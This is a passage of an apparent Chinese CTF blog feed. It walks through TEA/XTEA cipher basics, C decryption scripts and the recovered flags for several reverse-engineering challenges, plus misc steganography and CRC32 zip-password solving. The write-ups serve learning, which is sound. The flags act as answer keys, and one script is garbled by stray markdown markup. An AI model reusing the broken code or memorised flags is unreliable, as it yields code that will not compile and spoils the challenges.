alt="img"></p><p>函数中标注，正确的起点是[13,0]</p><p>这里需要我们自己根据函数生成迷宫</p><p>暂时无法在飞书文档外展示此内容</p><p>发现有空格，直接在最前面补0</p><p>暂时无法在飞书文档外展示此内容</p><p>找到最短路径</p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847356-16.png" alt="img"></p><p>最后得到flag，在这道题目中，用ijkl表示</p><p><strong>flag{llllkkkhhhkkkkkkkkklllljjjjllljjljjjjjjjlllkkkklljjjl}</strong></p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week3-re-tea</title>
      <link href="/2025/05/06/week3-re-tea/"/>
      <url>/2025/05/06/week3-re-tea/</url>
      
        <content type="html"><![CDATA[<h1 id="week3-re-tea"><a href="#week3-re-tea" class="headerlink" title="week3-re-tea"></a>week3-re-tea</h1><h1 id="算法特征"><a href="#算法特征" class="headerlink" title="算法特征"></a>算法特征</h1><h2 id="tea-算法"><a href="#tea-算法" class="headerlink" title="tea 算法"></a>tea 算法</h2><p>主要特征表现在 sum 和 delta 变量，以及三行核心加密中出现的右移 4 左移 5，两行各有 3 个小括号相互异或。</p><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>密钥长度为 128 位</p><p>下面被拆分成 4 个子密钥 <code>[K0,K1,K2,K3]</code></p><p>将 64 位明文分成两部分（假设为 <code>L</code>，<code>R</code>，各 32 位）</p><p>进行 64 轮加密，更新 <code>L</code>，<code>R</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">    L += ((R &lt;&lt; <span class="number">4</span>) + K0) ^ (R + sum) ^ ((R &gt;&gt; <span class="number">5</span>) + K1);</span><br><span class="line">    R += ((L &lt;&lt; <span class="number">4</span>) + K2) ^ (L + sum) ^ ((L &gt;&gt; <span class="number">5</span>) + K3);</span><br><span class="line">    sum += delta; <span class="comment">// delta = 0x9E3779B9（黄金比例相关）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>(R &lt;&lt; 4) + K0</code>：左移 4 位后叠加 <code>K0</code>。</li><li><code>(R &gt;&gt; 5) + K1</code>：右移 5 位后叠加 <code>K1</code>。</li></ul><p>sum 初始值为 0，每轮加密累加 delta</p><h2 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h2><p>增多了密钥表，移位和异或等操作</p><h3 id="核心加密"><a href="#核心加密" class="headerlink" title="核心加密"></a>核心加密</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">L += ((R &lt;&lt; <span class="number">4</span> ^ R &gt;&gt; <span class="number">5</span>) + R) ^ (sum + K[sum &amp; <span class="number">3</span>]); <span class="comment">// 动态选择密钥</span></span><br><span class="line">sum += delta;</span><br><span class="line">R += ((L &lt;&lt; <span class="number">4</span> ^ L &gt;&gt; <span class="number">5</span>) + L) ^ (sum + K[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br></pre></td></tr></table></figure><h2 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h2><p>再难一点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v[j] += ((v[j<span class="number">-1</span>] &lt;&lt; <span class="number">4</span> ^ v[j<span class="number">-1</span>] &gt;&gt; <span class="number">5</span>) + v[j<span class="number">-1</span>]) ^ (sum + K[(j &amp; <span class="number">3</span>) ^ e]); <span class="comment">// 多块混合</span></span><br></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="GDOUCTF-2023-Tea"><a href="#GDOUCTF-2023-Tea" class="headerlink" title="[GDOUCTF 2023]Tea"></a>[GDOUCTF 2023]Tea</h2><p>先查壳</p><p><img src="/images/week3-re-tea.assets/A06tbyUzkoponFxEcRZcWUQvnYf.png"></p><p>我们用 ida 打开后 利用 shift+f12 查找关键字，如下</p><p><img src="/images/week3-re-tea.assets/K2IHbgl2So2EArxbTwacG7k1nSd.png"></p><p>我们看到了 you are right，跟进（尝试），并查看 交叉引用（ctrl+x）</p><p><img src="/images/week3-re-tea.assets/P8fabNUs9oKDg1xytXzcmaA5n8c.png"></p><p>并按 F5，进入</p><p><img src="/images/week3-re-tea.assets/RnVRbr1eioxuI6x5NxJcylkBnAb.png"></p><p>我们点进去查看</p><p><img src="/images/week3-re-tea.assets/LiUzbuqkqoPAskxOuv1cfgNCn6e.png"></p><p><img src="/images/week3-re-tea.assets/JpXsbpMXlo6qWxxkvGDcYJZ4njv.png"></p><p>这两个都是输入函数，将 <code>v7</code>，<code>v8</code> 分别输入，我们一个一个点进去看看</p><p><img src="/images/week3-re-tea.assets/DJc2bsL7TomqpMxrv1Oci5R8n1T.png"></p><ul><li>原来的 v7 值为 1234,5678,9012,3456</li><li>改变后的 v7 值为 2233,4455,6677,8899</li></ul><p>在上面的 sub_140011339 中，a1 就是最初的 v7</p><p>在 sub_140011352 中</p><p><img src="/images/week3-re-tea.assets/ChvpbNb1yogdDnxtwU2cffQQnAb.png"></p><p>在这里，a1 应该就对应的是 flag，也就是 v8，转换一下就是</p><p><img src="/images/week3-re-tea.assets/JAkzbJ5beoTF9IxFfpqcx0hHnmg.png"></p><p>进入下面的函数</p><p><img src="/images/week3-re-tea.assets/CHgfbrHdmo3nIwxKfLxc4W2pnqB.png"></p><p>里面是关键加密部分</p><p><img src="/images/week3-re-tea.assets/AUfUbRopjoGA8jxtUjEcPUD8n6b.png"></p><p><img src="/images/week3-re-tea.assets/Rw00bOog3otdAQxtm5ycFqiMnpf.png"></p><p>这里就是 Tea 加密过程，其中的 a2 是原本的 v7，也就是 key 值</p><p><img src="/images/week3-re-tea.assets/SxQlbNOleoaWplxz6OzcCbNPnKh.png"></p><p>我们进行改名，这道题差不多的逻辑就是这样</p><p>然后利用 c 语言对 Tea 加密过程进行逆写，形成一个解密脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> delta 0xF462900</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;<span class="number">2233</span>,<span class="number">4455</span>,<span class="number">6677</span>,<span class="number">8899</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> Data[<span class="number">10</span>] = &#123; <span class="number">0x1A800BDA</span> ,<span class="number">0xF7A6219B</span> ,<span class="number">0x491811D8</span>,<span class="number">0xF2013328</span>,<span class="number">0x156C365B</span>, <span class="number">0x3C6EAAD8</span>,<span class="number">0x84D4BF28</span>,<span class="number">0xF11A7EE7</span>,<span class="number">0x3313B252</span>,<span class="number">0xDD9FE279</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> j;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">8</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        j = <span class="number">33</span>;</span><br><span class="line">        sum = delta * (i + j);</span><br><span class="line">        <span class="keyword">while</span>(j--)</span><br><span class="line">        &#123; </span><br><span class="line">            sum -= delta;</span><br><span class="line">            Data[i + <span class="number">1</span>] -= (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ ((Data[i] + ((Data[i] &gt;&gt; <span class="number">5</span>) ^ (Data[i] &lt;&lt; <span class="number">4</span>))));</span><br><span class="line">            Data[i] -= sum ^ (Data[i + <span class="number">1</span>] + ((Data[i + <span class="number">1</span>] &gt;&gt; <span class="number">5</span>) ^ (Data[i + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>))) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, Data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>485a4354467b687a4374665f39345f726536363666696e676372793536343171717d0</code></p><p>利用赛博厨子进行十六进制解码</p><p><img src="/images/week3-re-tea.assets/GPinblCHCoCkOuxntrfcnXmZnrb.png"></p><p><code>HZCTF&#123;hzCtf_94_re666fingcry5641qq&#125;</code></p><h2 id="MoeCTF-2022-ezTea"><a href="#MoeCTF-2022-ezTea" class="headerlink" title="[MoeCTF 2022]ezTea"></a>[MoeCTF 2022]ezTea</h2><p>打开题目中的 c 语言代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;                       <span class="comment">// 涓昏鍔犲瘑鍑芥暟锛岃瘯鐫€鎼炲畾瀹?</span></span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xd33b470</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">int8_t</span> input[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%32s&quot;</span>, input);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i+=<span class="number">8</span>) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123;*(<span class="type">uint32_t</span> *)&amp;input[i], *(<span class="type">uint32_t</span> *)&amp;input[i+<span class="number">4</span>]&#125;;</span><br><span class="line">        encrypt(v, k);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++) &#123;                           <span class="comment">// 杩欎竴娈典富瑕佹槸鎶?v 鎸夊崟瀛楄妭杈撳嚭锛屽彟澶栧彲浠ヤ簡瑙ｄ竴涓?鈥滃ぇ灏忕搴忊€?鍦ㄨ繖棰樻槸濡備綍浣撶幇鐨?</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%#x, &quot;</span>, v[j] &amp; <span class="number">0xff</span>);</span><br><span class="line">                v[j] &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这段代码是一个 TEA 变种加密实现，对 32 字节输入分组加密。</li><li>核心：32 轮 Feistel 运算，密钥 <code>&#123;1,2,3,4&#125;</code>，<code>delta=0xd33b470</code>。</li></ul><p>根据提示，当输入正确的 flag 时，会输出 <code>0x17, 0x65, 0x54, 0x89, 0xed, 0x65, 0x46, 0x32, 0x3d, 0x58, 0xa9, 0xfd, 0xe2, 0x5e, 0x61, 0x97, 0xe4, 0x60, 0xf1, 0x91, 0x73, 0xe9, 0xe9, 0xa2, 0x59, 0xcb, 0x9a, 0x99, 0xec, 0xb1, 0xe1, 0x7d</code></p><p>输入的 flag 被分为 4 组，每组 8 字节</p><ul><li><code>sum</code> 初始值为 <code>delta * 32</code>（因为加密时 <code>sum</code> 累加了 32 次 <code>delta</code>）。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">void decrypt(uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0 = v[0], v1 = v[1];</span><br><span class="line">    uint32_t delta = 0xd33b470;</span><br><span class="line">    uint32_t sum = delta * 32; // 加密时的最终sum值</span><br><span class="line">    for (int i = 0; i &lt; 32; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[1]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[0] = v0;</span><br><span class="line">    v[1] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    uint32_t k[4] = &#123;1, 2, 3, 4&#125;;</span><br><span class="line">    // 给定的密文（按小端序组合成uint32_t）</span><br><span class="line">    uint8_t cipher[32] = &#123;</span><br><span class="line">        0x17, 0x65, 0x54, 0x89, 0xed, 0x65, 0x46, 0x32, </span><br><span class="line">        0x3d, 0x58, 0xa9, 0xfd, 0xe2, 0x5e, 0x61, 0x97, </span><br><span class="line">        0xe4, 0x60, 0xf1, 0x91, 0x73, 0xe9, 0xe9, 0xa2, </span><br><span class="line">        0x59, 0xcb, 0x9a, 0x99, 0xec, 0xb1, 0xe1, 0x7d</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // 每组8字节解密</span><br><span class="line">    for (int i = 0; i &lt; 32; i += 8) &#123;</span><br><span class="line">        // 将小端序的密文转换为uint32_t</span><br><span class="line">        uint32_t v[2] = &#123;</span><br><span class="line">            *(uint32_t*)&amp;cipher[i],</span><br><span class="line">            *(uint32_t*)&amp;cipher[i+4]</span><br><span class="line">        &#125;;</span><br><span class="line">        decrypt(v, k);</span><br><span class="line">        // 输出解密后的明文（按小端序）</span><br><span class="line">        for (int j = 0; j &lt; 2; j++) &#123;</span><br><span class="line">            for (int k = 0; k &lt; 4; k++) &#123;</span><br><span class="line">                printf(&quot;%c&quot;, (v[j] &gt;&gt; (k * 8)) &amp; 0xff);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行得到 flag <code>moectf&#123;Th3_TEA_!S_s0_t4s7y~~!!!&#125;</code></p><h2 id="HNCTF-2022-WEEK2-TTTTTTTTTea"><a href="#HNCTF-2022-WEEK2-TTTTTTTTTea" class="headerlink" title="[HNCTF 2022 WEEK2]TTTTTTTTTea"></a>[HNCTF 2022 WEEK2]TTTTTTTTTea</h2><p>先查壳</p><p><img src="/images/week3-re-tea.assets/P5fEbONgQo3UAIxciulcHKU1nbb.png"></p><p>我们先查一下关键字</p><p><img src="/images/week3-re-tea.assets/Mflxbh11ioStjtxXXxHclxCqn2b.png"></p><p>这个可能是我们需要的，跟进，查看交叉引用</p><p><img src="/images/week3-re-tea.assets/OvUeb0Umgoh4Qrx39Aqca689ncc.png"></p><p>F5</p><p><img src="/images/week3-re-tea.assets/YScAbuoMyom52jxs1H1cWfzbneb.png"></p><p><img src="/images/week3-re-tea.assets/Hcpnbwi9joPIp6xfYqwcJUEsnee.png"></p><p>跟进&amp;key</p><p><img src="/images/week3-re-tea.assets/BtQLbTY4toqEn1xsWWvcTF1Vnj6.png"></p><p><img src="/images/week3-re-tea.assets/LgOjbizKGoexOzxnV6jcGbqdnMg.png"></p><p>得到 key 的</p><p>看到 <code>tea_encrypt(&amp;v4[2 * j + 8], &amp;key);</code>，跟进一下</p><p><img src="/images/week3-re-tea.assets/Gzv4bw1w0o1YHSxXbNrcf04fnnX.png"></p><p>看到主加密函数，这是一个 xtea，接下来逆向，写解密脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">**#include&lt;stdio.h&gt;int** **main**()&#123;</span><br><span class="line">        **unsigned** **int** enc[6] = &#123;0xC11EE75A, 0xA4AD0973, 0xF61C9018, 0x32E37BCD, 0x2DCC1F26, 0x344380CC&#125;;</span><br><span class="line">    **unsigned** **int** key[4] = &#123;0x10203, 0x4050607, 0x8090A0B, 0x0C0D0E0F&#125;;</span><br><span class="line">        **int** i, j;</span><br><span class="line">        **long** sum = 0, delta = 0x61C88647;</span><br><span class="line">    _// 解码_**for**(i=0;i &lt; 6;i+=2)&#123;</span><br><span class="line">                sum =  0 - (32 * delta);</span><br><span class="line">                **for**(j = 0; j &lt; 32; j++) &#123;</span><br><span class="line">                        enc[i+1] -= (((enc[i] &gt;&gt; 5) ^ (16 * enc[i])) + enc[i]) ^ (key[((sum &gt;&gt; 11) &amp; 3)] + sum);</span><br><span class="line">                        sum += delta;</span><br><span class="line">                        enc[i] -= ((((enc[i+1] &gt;&gt; 5) ^ (16 * enc[i+1])) + enc[i+1]) ^ key[sum &amp; 3] + sum);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    _// 打印_**for** (i = 0; i &lt; 6; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                **for** (j = 0; j&lt;=3; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                        printf(&quot;%c&quot;, (enc[i] &gt;&gt; (j * 8)) &amp; 0xFF);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        **return** 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到 flag <code>NSSCTF&#123;Tea_TEA_TeA_TEa+&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week1-re-校赛wp</title>
      <link href="/2025/05/06/week1-re-%E6%A0%A1%E8%B5%9Bwp/"/>
      <url>/2025/05/06/week1-re-%E6%A0%A1%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="week1-校赛复现"><a href="#week1-校赛复现" class="headerlink" title="week1-校赛复现"></a>week1-校赛复现</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="baby-misc"><a href="#baby-misc" class="headerlink" title="baby_misc"></a>baby_misc</h2><p>下载压缩包打开后，其中还有一个压缩文件和一个 mp3 格式文件，其中的压缩文件是加密的，如下：</p><p><img src="/week1-re-%E6%A0%A1%E8%B5%9Bwp/A6SvboDrooGIVMxzEIicMfqon1g.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Kd2GbYE0tofy22xjrE9cHjY6nkf.png"></p><p>所以我们要找到这个文件的密码，由题目中的提示，如下：</p><p>可知 mp3 音频的密码是 1111，解决音频后可能得到压缩包的密码</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/CaXBbfgW2ocQHOxPDNUc0FHfndc.png"></p><p>对于如何在 MP3stego 中执行解码命令</p><p><code>decode -X -P 密码 输入.mp3</code></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/BfnFbbIFqoxDArxiAzhcpASznQc.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/RUGibCuYYo7dbqxVQuJclR5Gn8f.png"></p><p>打开后发现是压缩包，将其复制进入 010，并保存</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/P130b3ZUZobGKNxdliMcrT2tnGZ.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/OxOabaiWYouyjTxElxicJjEBnNc.png"></p><p>保存成压缩包形式打开后</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/XSW5btrAAoGToQx71oAc1nwVnKh.png"></p><p>发现每一个文本中都有循环冗余，原始大小都为 6 字节</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/F53lb2rZFoua8ex6W5BcOeQ9nZd.png"></p><p>依次暴破</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/NohrbmTf7oaf26xYbnTcCc9OnYe.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/ZA9SbyOKFoi6r7x9p5dcXvGLncK.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/GI1qbDdkcoY1ywxpI5PcMrK6nA4.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/PHnWbTLvCoiuTVxoSgOcxnS2ngc.png"></p><p>找到了压缩文件密码，如下：</p><p><strong>oh_you_are_9ood_at_CRC32</strong></p><p>解压完成后打开，内容如下：</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/JKW8bRlnJoIm1GxnujgccfVPn4b.png"></p><p>看他的文件头，就可以发现这是一个 gif 动图，将其复制进 010 中并保存</p><p>重新打开后就可以看到转瞬即逝的 flag，利用 stegsolve 分析</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/GwMkby4Okoxwg2xdbE3cYhe3nJg.png"></p><p>选择 Frame Browser 对动图进行逐帧分析</p><p>得到</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/W9AVbHdYUo0ByMxMN9fcsJNHnTc.png"></p><p><code>QLNU&#123;L1st3n_bE4ut1ful_5ong&#125;</code></p><h2 id="Ez-QR"><a href="#Ez-QR" class="headerlink" title="Ez_QR"></a>Ez_QR</h2><p>下载并解压附件后是 50 个二维码</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/HzWpbn1RJoIpvkxbzCIcFFtIn7e.png"></p><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>依次扫描 ，组合，就得到 flag</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>利用 python 脚本来解决，但是我这个脚本有些许复杂，它只能出来单个的，并且是乱序，需要自己进行排序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import glob</span><br><span class="line">import zxing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read_qr_code(image_path):</span><br><span class="line">    _&quot;&quot;&quot; 读取二维码图片并解析其内容 &quot;&quot;&quot;_</span><br><span class="line">_    _reader = zxing.BarCodeReader()</span><br><span class="line">    barcode = reader.decode(image_path)</span><br><span class="line">    return barcode.raw if barcode else None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def extract_flag_from_folder(folder_path):</span><br><span class="line">    _&quot;&quot;&quot; 扫描文件夹中的所有二维码图片并分别显示解析内容 &quot;&quot;&quot;_</span><br><span class="line">_    _qr_files = glob.glob(os.path.join(folder_path, &quot;*.png&quot;)) + \</span><br><span class="line">               glob.glob(os.path.join(folder_path, &quot;*.jpg&quot;)) + \</span><br><span class="line">               glob.glob(os.path.join(folder_path, &quot;*.jpeg&quot;))</span><br><span class="line"></span><br><span class="line">    if not qr_files:</span><br><span class="line">        print(&quot;未找到二维码图片&quot;)</span><br><span class="line">        return &quot;&quot;</span><br><span class="line"></span><br><span class="line">    flag_parts = []</span><br><span class="line">    for file in sorted(qr_files):  # 按文件名排序，确保顺序正确</span><br><span class="line">        content = read_qr_code(file)</span><br><span class="line">        if content:</span><br><span class="line">            print(f&quot;文件: &#123;os.path.basename(file)&#125; -&gt; 内容: &#123;content&#125;&quot;)</span><br><span class="line">            flag_parts.append(content)</span><br><span class="line"></span><br><span class="line">    flag = &#x27;&#x27;.join(flag_parts)</span><br><span class="line">    print(&quot;\n完整 Flag:&quot;, flag)</span><br><span class="line">    return flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == 